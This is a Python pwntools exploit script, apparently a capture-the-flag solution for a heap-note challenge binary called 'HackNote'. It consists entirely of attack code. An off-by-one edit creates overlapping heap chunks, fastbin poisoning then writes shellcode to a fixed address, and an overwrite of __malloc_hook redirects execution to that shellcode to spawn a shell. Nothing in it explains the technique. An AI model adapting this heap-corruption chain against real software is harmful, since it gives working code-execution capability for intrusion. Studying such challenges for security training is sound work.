from pwn import *
context.log_level = 'debug'
context(arch = 'amd64', os = 'linux')
shellcode=asm(shellcraft.sh())
debug=1
if debug==0:
    io = remote()
    elf=ELF("./HackNote")
elif debug==1:
    io =  process("./HackNote")
    elf=ELF("./HackNote")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

s       = lambda data               :io.send(str(data)) 
sa      = lambda delim,data         :io.sendafter(str(delim), str(data))
sl      = lambda data               :io.sendline(str(data))
sla     = lambda delim,data         :io.sendlineafter(str(delim), str(data))
r       = lambda numb=4096          :io.recv(numb)
ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)

def add(size,content):
    ru('-----------------\n')
    sl(1)    
    ru('Input the Size:\n')
    sl(size)
    ru('Input the Note:\n')
    s(content)

def delete(i):#once
    ru('-----------------\n')
    sl(2)    
    ru('Input the Index of Note:\n')
    sl(i)

def edit(i,content):
    ru('-----------------\n')
    sl(3)    
    ru('Input the Index of Note:\n')
    sl(i)
    ru('Input the Note:\n')
    s(content)

add(0x88,"0"*0x88)
edit(0,"0"*0x88)
add(0x40-8,"1"*0x38)
edit(1,"1"*0x38)
add(0x88,"2"*0x88)
edit(2,"2"*0x88)
add(0x88,"3"*0x88)
edit(3,"3"*0x88)
add(0x88,"4"*0x88)
edit(4,"4"*0x88)
delete(0)

#overlap
edit(2,"2"*0x80+p64(0x90+0x40+0x90)+'\x90\n')
delete(3)

delete(1)
c=''
c+="0"*0x88
c+=p64(0x40+1)
scaddr=0x006cb0c0-0x26-8
c+=p64(scaddr)#shellcode addr
c+='\n'
add(0x90+0x40+0x90+0x90-8,c)#0
add(0x40-8,'\n')#1
add(0x40-8,shellcode+'\n')#3

delete(1)
c=''
c+="0"*0x88
c+=p64(0x41)
c+=p64(0x6cb788-0x10+2-8)#malloc hook
c+='\n'
edit(0,c)
add(0x40-8,'\n')#1
add(0x40-8,'\x00'*6+p64(scaddr+0x10)+'\n')#3

#getshell
ru('-----------------\n')
sl(1)    
ru('Input the Size:\n')
sl(0x20)
io.interactive()